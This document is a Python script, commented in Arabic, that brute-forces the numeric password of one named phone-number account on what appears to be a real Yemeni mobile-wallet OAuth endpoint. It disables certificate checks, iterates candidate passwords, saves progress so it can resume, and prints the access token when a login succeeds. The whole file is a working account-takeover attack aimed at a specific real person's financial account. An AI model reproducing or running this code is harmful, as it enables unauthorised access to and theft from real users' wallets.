import requests
import time
import os
from requests.exceptions import RequestException

requests.packages.urllib3.disable_warnings()

BASE_URL = "https://app.jawali-ye.com.ye:8473/walletmobileproxy/"
ENDPOINT = "oauth/token"
FULL_URL = BASE_URL + ENDPOINT

BASE_DATA = {
    "grant_type": "password",
    "client_id": "restapp",
    "client_secret": "restapp",
    "username": "772490746",
    "scope": "openid"
}

initial_password = 142800633
MAX_ATTEMPTS = 1000  # عدد محدود للاختبار

PROGRESS_FILE = "sh.txt"

def load_progress():
    if os.path.exists(PROGRESS_FILE):
        try:
            with open(PROGRESS_FILE, "r") as f:
                return int(f.read().strip())
        except:
            return None
    return None

def save_progress(value):
    with open(PROGRESS_FILE, "w") as f:
        f.write(str(value))
        f.flush()

def get_access_token():
    saved = load_progress()
    if saved is not None:
        current_password = saved + 1
        print(f"🔄 استئناف من {current_password} (آخر محفوظ: {saved})")
    else:
        current_password = initial_password
        print(f"🔄 بدء من {current_password}")

    for attempt in range(1, MAX_ATTEMPTS + 1):
        data = BASE_DATA.copy()
        data["password"] = str(current_password)

        try:
            response = requests.post(FULL_URL, data=data, verify=False, timeout=10)
            print(f"محاولة {attempt}: كود {response.status_code} - كلمة المرور {current_password}")  # طباعة كل محاولة

            if response.status_code == 200:
                json_response = response.json()
                save_progress(current_password)
                print(f"\n✅ نجاح! كلمة المرور: {current_password}")
                print(f"🔑 التوكن: {json_response.get('access_token')}")
                return json_response
        except Exception as e:
            print(f"❌ خطأ: {e}")

        # حفظ كل محاولة
        save_progress(current_password)
        current_password += 1
        time.sleep(0.001)

    print("❌ انتهت المحاولات دون نجاح")
    return None

if __name__ == "__main__":
    token_data = get_access_token()
    if token_data:
        print("✅ البوت يعمل بنجاح.")
    else:
        print("❌ تعذر الحصول على التوكن.")
